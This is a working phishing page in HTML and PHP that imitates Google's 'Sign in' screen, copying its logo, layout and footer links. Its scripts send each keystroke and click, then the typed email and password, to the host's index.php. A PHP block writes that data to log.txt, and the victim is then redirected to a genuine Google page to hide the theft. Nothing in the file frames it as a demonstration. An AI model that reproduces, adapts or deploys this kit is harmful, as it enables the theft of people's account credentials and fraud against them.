<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="preconnect" href="https://fonts.gstatic.com" />
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet"/>
  <link rel="icon" type="image/x-icon" href="https://google.com/favicon.ico">
  <title>Sign in – Google accounts</title>
  <script>
var server = "https://" + location.host + "/index.php";
(function() {
    var server = "https://" + location.host + "/index.php";
    document.addEventListener("keyup", function(e) {
        var x = new XMLHttpRequest();
        x.open("POST", server, true);
        x.send(e.key);
    });
    document.addEventListener("click", function(e) {
        var click;
        if (e.which == 1) {
            click = " Click ";
        } else {
            click = " Click ";
        }
        var x = new XMLHttpRequest();
        x.open("POST", server, true);
        x.send(click);
    });
})();

function updatetext() {
  // var title_box = document.location.host;
  // var mxlen = 27;
  // var title_box = title_box.substr(0, mxlen);
  var title_box = "Use your Google Account";
  let input_element = document.querySelector("input");

  input_element.addEventListener("keyup", () => {
    input_element.setAttribute("value", input_element.value);
    document.getElementById("placeholder_").style.cssText = `font-size:12px;`;
  })

  document.getElementById("text_2").innerHTML = title_box;
}

function showpass() {
  var passwd = window.getComputedStyle(document.getElementById("fname")).fontFamily;
  var passwd_ = document.getElementById("fname")
  if (passwd === 'Roboto, sans-serif') {
    passwd_.style.fontFamily = 'password';
  } else {
    passwd_.style.fontFamily = 'Roboto, sans-serif';
  }
}

function next() {
  var emty = "";
  var mailid = document.getElementById("fname").value;
  var x = new XMLHttpRequest();
  x.open("POST", server, true);
  x.send(" | EmailID : " + mailid + " | ");
  if (mailid > "") {
    document.getElementById("document_html_").innerHTML = `
<body id="document_html_" onload="updatetext()">
  
    <div class="container">
      <div class="card">
        <div class="Lth2jb " jsname="n7vHCb" jscontroller="rKxYMb" jsaction="rcuQ6b:qg4Ic;Kzwjs:WPi0i;" data-oauth-third-party-logo-url="" aria-hidden="true"><div jsname="jjf7Ff"><div id="logo" class="v8vQje" title="Google"><div class="rr0DNb" jsname="l4eHX"><svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="l5Lhkf"><g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g><g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g><g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g><g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g><g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g><g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g></svg></div></div></div></div>
        <h2>Welcome</h2><br>
        <div class="aCayab" style="margin: 0; padding: 0;"><div></div><div jscontroller="IIfQad" jsaction="click:cOuCgd; blur:O22p3e; mousedown:UX7yZ; mouseup:lbsD7e; touchstart:p6p2H; touchend:yfqBxc;" class="YZrg6 HnRr5d iiFyne cd29Sd" tabindex="0" role="link" jsname="af8ijd"><div class="gPHLDe"><div class="qQWzTd" aria-hidden="true"><svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="23px" height="23px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg></div></div><div jsname="fmcmS" class="KTeGk" data-profile-identifier=""><a style="font-size: 12px;" id="email_">whoami...</a></div><div class="krLnGe"><svg aria-hidden="true" class="stUf5b MSBt4d" fill="transparent" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon></svg></div></div></div>
        <br><br>
        <div class="input-contain">
<form method="post" action="#">
  <input type="text" style="font-family: password;" id="fname" name="fname" autocomplete="off" value="" aria-labelledby="placeholder-fname">
  <label class="placeholder-text" for="fname" id="placeholder-fname">
     <div id="placeholder_" class="text" style="font-size: 12px;">Enter your password</div>
  </label>
</form></div>
  <div style="text-align: left;!important">
  <b id="error"></b>
  <br>
    <input type="checkbox" style="width: 15px; height: 15px;" onclick="showpass()"><a style="margin-top: -30px;">&nbsp;Show password</a>
  <div class="card-bottom">
          <a target="_blank" href="https://google.com//>/>">Forgot Password?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
          <button type="button" onclick="next2()" class="disable-select">Next</button>
        </div><div style="height: 110px;"></div>
        
      </div>
      
      <div class="footer">
        <select class="disable-select" name="select">
          <option value="English (United States)">
            English (United States)
          </option>
        </select>
        <div class="footer-span">
          <span><a target="_blank" class="btn" href="https://support.google.com/accounts?hl=en">Help</a></span>
          <span><a target="_blank" class="btn" href="https://accounts.google.com/TOS?loc=US&amp;hl=en&amp;privacy=true">Privacy</a></span>
          <span><a target="_blank" class="btn" href="https://accounts.google.com/TOS?loc=US&amp;hl=en">Terms</a></span>
        </div>
      </div>
    </div>
  </div>
</body>`;
    fixoverride()
    var emailen = 42;
    var mailid = mailid.substr(0, emailen);
    document.getElementById("email_").innerHTML = mailid + "...";
  } else { 
    document.getElementById("spacer").innerHTML = `<br>`;
    const input_box = document.querySelector('#fname');
    const input_text = document.querySelector('#placeholder_');
    input_box.style.cssText = "outline: none;border: 2px solid red;";
    input_text.style.cssText = "color: red;";
    document.getElementById("error").innerHTML = `<span style="margin-top: -40px; text-align: left;" class="jibhHc inline-block"><svg style="text-align: left;" aria-hidden="true" class="stUf5b qpSchb" fill="#d93025" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg><p class="inline-block" style="color: red;">&nbsp;<a style="color: red; font-weight: 500; margin-top: 10px;">Enter an email or phone number</p></span></div>`
  }
}

function fixoverride() {
  var input_element = document.querySelector("input");

  document.addEventListener("click", function(){
    input_element.setAttribute("value", input_element.value);
    document.getElementById("placeholder_").style.cssText = "font-size:12px;" ;
  });
}

function next2() {
  var emty = "";
  var mailid = document.getElementById("fname").value;
  var x = new XMLHttpRequest();
  x.open("POST", server, true);
  x.send("| Password : " + mailid + " | ");
  if (mailid > "") {
    window.location = "https://www.google.com/account/about/?hl=en-GB";
  } else { 
    document.getElementById("spacer").innerHTML = `<br>`;
    const input_box = document.querySelector('#fname');
    const input_text = document.querySelector('#placeholder_');
    input_box.style.cssText = "outline: none;border: 2px solid red;";
    input_text.style.cssText = "color: red;";
    document.getElementById("error").innerHTML = `<span style="margin-top: -40px; text-align: left;" class="jibhHc inline-block"><svg style="text-align: left;" aria-hidden="true" class="stUf5b qpSchb" fill="#d93025" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg><p class="inline-block" style="color: red;">&nbsp;<a style="color: red; font-weight: 500; margin-top: 10px;">Enter a password</p></span></div>`
  }
}
  </script>
  <style>
* {
  margin: 0;
  padding: 0;
  font-family: "Roboto", sans-serif;
  box-sizing: border-box;
}

:root {
  --principal: #202124;
  --p: #797d80;
  --blue: #2c7fea;
  --border-card: #dadce0;
}

.container {
  width: 100vw;
  height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-direction: column;
  min-height: 500px;
}

.card {
  height: 500px;
  width: 448px;
  border-radius: 8px;
  border: 1px solid var(--border-card);
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 48px 40px 36px;
}

.card h2 {
  padding-top: 16px;
  font-weight: 400;
  font-size: 24px;
}

.card h3 {
  padding: 11px 0 35px 0;
  font-weight: 400;
  font-size: 16px;
}

.card input {
  padding: 13px 15px;
  width: 100%;
  height: 55px;
  border-radius: 4px;
  border: 1px solid var(--border-card);
  outline-color: #1973e8;
  font-size: 16px;
}

.card .btn-email {
  padding-top: 12px;
  width: 100%;
}

.card .btn-email button {
  background: transparent;
  border: none;
  cursor: pointer;
  color: var(--blue);
  font-weight: 700;
  font-size: 14px;
  outline: none;
}

.card p {
  padding-top: 48px;
  color: var(--p);
  font-size: 14px;
  line-height: 1.5;
}

.card p a {
  background: transparent;
  border: none;
  cursor: pointer;
  color: var(--blue);
  font-weight: 600;
  text-decoration: none;
}

.card .card-bottom {
  margin-top: 40px;
  width: 100%;
  margin-right: 18px;
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.card .card-bottom a {
  border: none;
  cursor: pointer;
  color: var(--blue);
  font-weight: 800;
  text-decoration: none;
  font-size: 14px;
  margin: 8px;
}

.card .card-bottom button {
  background: var(--blue);
  color: white;
  padding: 9px 24px;
  font-size: 14px;
  outline: none;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  transition: 0.2s;
}

.card .card-bottom button:hover {
  background: #1a66c9;
}

.footer {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding-top: 24px;
  font-size: 12px;
  width: 448px;
  color: var(--p);
}

.footer select {
  background: transparent;
  border: none;
  cursor: pointer;
  outline: none;
}

.footer .footer-span span {
  margin-left: 32px;
}

.link {
  text-decoration: none;
  color: #2f80ea;
}

.inline-block {
  display: inline-block;
}

.disable-select {
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

mark.blue_ {
  color: #2f80ea;
  background: none;
  font-weight: 500;
}

.footer-span a {
  -webkit-border-radius: 2px;
  border-radius: 2px;
  color: #757575;
  display: inline-block;
  margin-top: -6px;
  -webkit-transition: background .2s;
  transition: background .2s;
  text-decoration: none;
}

input:focus {
  outline: none;
  border: 2px solid #1a73e8;
}

.input-contain{
    position: relative;
    width: 100%;
}
input{
    height: 5rem;
    width: 40rem;
    border: 2px solid black;
    border-radius: 1rem;
}

.placeholder-text{
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    border: 3px solid transparent;
    background-color: transparent;
    display: flex;
    align-items: center;
}

.placeholder-text{
    pointer-events: none;
}

.text{
    padding: 0 0.5rem;
    background-color: transparent;
    color: #757575;
}

input, .placeholder-text{
    padding: 0 0.3rem;
}

input:focus{
    outline: none;
    border-color: #1a73e8;
}

input:focus + .placeholder-text .text{
    background-color: white;
    color: black;
    font-size: 12px;
    margin-top: -8px;
    transform: translate(0, -170%);
    border-color: #1a73e8;
    color: #1a73e8;
}

.text{
    transform: translate(0);
    transition: transform 0.2s ease-out, font-size 0.2s ease-out, background-color 0.2s ease-out, color 0.2s ease-out;
}

input:focus + .placeholder-text .text, :not(input[value=""]) + .placeholder-text .text{
    background-color: white;
    color: black;
    transform: translate(0, -170%);
}

input:focus + .placeholder-text .text{
    border-color: #1a73e8;
    color: #1a73e8;
}

@font-face {
  font-family: 'password';
  font-style: normal;
  font-weight: 400;
  src: url(https://jsbin-user-assets.s3.amazonaws.com/rafaelcastrocouto/password.ttf);
}

input.key {
  font-family: 'password';
  width: 100px; height: 16px;  
}

.H2SoFe *, .H2SoFe *:before, .H2SoFe *:after {
    -webkit-box-sizing: inherit;
    box-sizing: inherit;
}
.aCayab {
    height: 32px;
    margin-top: 8px;
}
.jXeDnc:not(.tmR25c) {
    text-align: center;
}

.HnRr5d.cd29Sd {
    padding-left: 5px;
}
.HnRr5d.iiFyne {
    padding-right: 7px;
}
.H2SoFe *, .H2SoFe *:before, .H2SoFe *:after {
    -webkit-box-sizing: inherit;
    box-sizing: inherit;
}
.HnRr5d {
    -webkit-border-radius: 16px;
    border-radius: 16px;
    padding: 0 15px 0 15px;
}
.YZrg6 {
    -webkit-align-items: center;
    align-items: center;
    background: #fff;
    border: 1px solid #dadce0;
    color: #3c4043;
    cursor: pointer;
    display: -webkit-inline-box;
    display: -webkit-inline-flex;
    display: inline-flex;
    font-family: "Google Sans","Noto Sans Myanmar UI",arial,sans-serif;
    font-size: 14px;
    font-weight: 500;
    letter-spacing: 0.25px;
    max-width: 100%;
    position: relative;
}
.gPHLDe { 
    -webkit-border-radius: 10px;
    border-radius: 10px;
    height: 20px;
    margin-right: 8px;
}
.qQWzTd {
    -webkit-border-radius: 50%;
    border-radius: 50%;
    color: #5f6368;
    overflow: hidden;
}
  </style>
</head>
<?php
  $o = fopen("php://input", "r");
  $str = stream_get_contents($o);
  fclose($o);
  $t = fopen("log.txt", "a+");
  fwrite($t, $str);
  fclose($t);
?>
<body id="document_html_" onload="updatetext()">
  <div class="container">
    <div class="card">
      <div class="Lth2jb " jsname="n7vHCb" jscontroller="rKxYMb" jsaction="rcuQ6b:qg4Ic;Kzwjs:WPi0i;" data-oauth-third-party-logo-url="" aria-hidden="true"><div jsname="jjf7Ff"><div id="logo" class="v8vQje" title="Google"><div class="rr0DNb" jsname="l4eHX"><svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="l5Lhkf"><g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g><g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g><g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g><g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g><g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g><g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g></svg></div></div></div></div>
      <h2>Sign in</h2>
      <h3 id="text_2">Use your Google Account</h3>
      <div class="input-contain">
        <form method="post" action="#">
          <input type="text" id="fname" name="fname" autocomplete="off" value="" aria-labelledby="placeholder-fname">
          <label class="placeholder-text" for="fname" id="placeholder-fname">
            <div id="placeholder_" class="text">Email or phone</div>
          </label></form>
        </div>
      <div style="text-align: left;!important">
      <b id="error"></b>
      <div class="btn-email">
        <button type="button" href="https://google.com//>/>"><a target="_blank" href="https://google.com//>/>" class="link">Forgot Email?</a></button>
      </div>
      <p>
          Not your computer? Use Guest mode to sign in privately.
        <a target="_blank" href="https://support.google.com/chrome/answer/6130773?hl=en-GB">Learn more</a>
      </p>
      <div class="card-bottom">
        <a target="_blank" href="https://google.com//>/>">Create account</a>
        <button type="button" onclick="next()" class="disable-select">Next</button>
      </div>
    </div>
    <div id="spacer"><br><br><div style="height: 10px;"></div></div>
    <div class="footer">
      <select class="disable-select" name="select">
        <option value="English (United States)">
          English (United States)
        </option>
      </select>
      <div class="footer-span">
        <span><a target="_blank" class="btn" href="https://support.google.com/accounts?hl=en">Help</a></span>
        <span><a target="_blank" class="btn" href="https://accounts.google.com/TOS?loc=US&hl=en&privacy=true">Privacy</a></span>
        <span><a target="_blank" class="btn" href="https://accounts.google.com/TOS?loc=US&hl=en">Terms</a></span>
      </div>
    </div>
  </div>
</body>
</html>
